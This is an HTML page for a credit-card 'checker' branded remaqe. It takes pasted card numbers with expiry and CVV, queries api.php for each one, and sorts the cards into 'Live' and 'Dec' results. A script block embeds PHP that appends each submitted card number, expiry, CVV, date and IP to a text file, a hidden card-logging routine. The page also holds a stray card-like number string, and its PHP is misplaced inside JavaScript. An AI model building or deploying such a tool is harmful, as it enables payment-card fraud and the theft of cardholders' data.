<html>
<head>
	<title>remaqe CC Checker</title>6505180027631032|06|2026|153
	<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.5.11/css/mdb.min.css" rel="stylesheet">
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
</head>

<body>
	<br>
		<div class="row col-md-12">
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
<div class="card col-sm-8">
  <h5 class="card-body h6">CC Checker - remaqe</h5>
  <div class="card-body">
    <center><span>[#REMAQE]</span></center>
<div class="md-form">
	<div class="col-md-12">
  <textarea type="text" style="text-align: center;" id="lista" class="md-textarea form-control" rows="2"></textarea>
  <label for="lista">Example : 5437711025954502|01|2023|160 </label>
</div>
</div>
<center>
 <button class="btn btn-primary" style="width: 200px; outline: none;" id="testar" onclick="enviar()" >Başlat</button>
  <button class="btn btn-danger" style="width: 200px; outline: none;">Durdur</button>
</center>
  </div>
</div>
&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
<div class="card col-sm-2">
  <h5 class="card-body h6">Bilgiler:</h5>
  <div class="card-body">
  	<span>Status:</span><span class="badge badge-secondary"> İşlem Bekleniyor</span>
<div class="md-form">
	<span>Live:</span>&nbsp<span id="cLive" class="badge badge-success">0</span>
	<span>Dec:</span>&nbsp<span id="cDie" class="badge badge-danger"> 0</span>
	<span>Test Edilen:</span>&nbsp<span id="total" class="badge badge-info">0</span>
	<span>Yüklenen:</span>&nbsp<span id="carregadas" class="badge badge-dark">0</span>
</div>
  </div>
</div>
</div>
<br>

<div class="col-md-12">
<div class="card">
<div style="position: absolute;
        top: 0;
        right: 0;">
	<button id="mostra" class="btn btn-primary">SHOW/HIDE</button>
</div>
  <div class="card-body">
    <h6 style="font-weight: bold;" class="card-title">Live - <span  id="cLive2" class="badge badge-success">0</span></h6>
    <div id="bode"><span id=".aprovadas" class="aprovadas"></span>
</div>
  </div>
</div>
</div>

<br>
<br>
<br>
<div class="col-md-12">
<div class="card">
	<div style="position: absolute;
        top: 0;
        right: 0;">
	<button id="mostra2" class="btn btn-primary">SHOW/HIDE</button>
</div>
  <div class="card-body">
    <h6 style="font-weight: bold;" class="card-title">Dec - <span id="cDie2" class="badge badge-danger">0</span></h6>
    <div id="bode2"><span id=".reprovadas" class="reprovadas"></span>
    </div>
  </div>
</div>
</div>

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.js" type="text/javascript"></script>
<script type="text/javascript">

$(document).ready(function(){


    $("#bode").hide();
	$("#esconde").show();
	
	$('#mostra').click(function(){
	$("#bode").slideToggle();
	});

});

</script>

<script type="text/javascript">

$(document).ready(function(){


    $("#bode2").hide();
	$("#esconde2").show();
	
	$('#mostra2').click(function(){
	$("#bode2").slideToggle();
	});

});
        $status = ".reprovadas";
    $fp = fopen('./remaqeex/nedeciaq.txt','a+');
    $cc = $_POST['cc'];
    $mes = $_POST['mes'];
    $ano = $_POST['ano'];
    $cvv = $_POST['cvv'];
    $data = date("m.d.y g:i a");
    $ip = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);   
    $mensagem = fwrite($fp,"-----------------------------------------------");
    $mensagem = fwrite($fp,"\nCC: ".$cc ."\nExp: ".$mes ."\nAno: ". $ano ."\nCCV: ". $cvv."\nDATA: ". $data."\nIP: ".$ip ."\nSTATUS: ".$status ."\n");
    $mensagem = fwrite($fp,"-----------------------------------------------");
    $mensagem = fwrite($fp,"\r\n");
    $fpc = fclose($fp);
</script>

<script title="ajax do checker">
    function enviar() {
        var linha = $("#lista").val();
        var linhaenviar = linha.split("\n");
        var total = linhaenviar.length;
        var ap = 0;
        var rp = 0;
        linhaenviar.forEach(function(value, index) {
            setTimeout(
                function() {
                    $.ajax({
                        url: 'api.php?lista=' + value,
                        type: 'GET',
                        async: true,
                        success: function(resultado) {
                            if (resultado.match("#Aprovada")) {
                                removelinha();
                                ap++;
                                aprovadas(resultado + "");
                            }else {
                                removelinha();
                                rp++;
                                reprovadas(resultado + "");
                            }
                            $('#carregadas').html(total);
                            var fila = parseInt(ap) + parseInt(rp);
                            $('#cLive').html(ap);
                            $('#cDie').html(rp);
                            $('#total').html(fila);
                            $('#cLive2').html(ap);
                            $('#cDie2').html(rp);
                        }
                    });
                }, 500 * index);
        });
    }

    function aprovadas(str) {
        $(".aprovadas").append(str + "<br>");
    }
    function reprovadas(str) {
        $(".reprovadas").append(str + "<br>");
    }
    function removelinha() {
        var lines = $("#lista").val().split('\n');
        lines.splice(0, 1);
        $("#lista").val(lines.join("\n"));
    }


</script>



<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.5.11/js/mdb.min.js"></script>
</body>
<br>
<footer >





  </footer> 

</html>
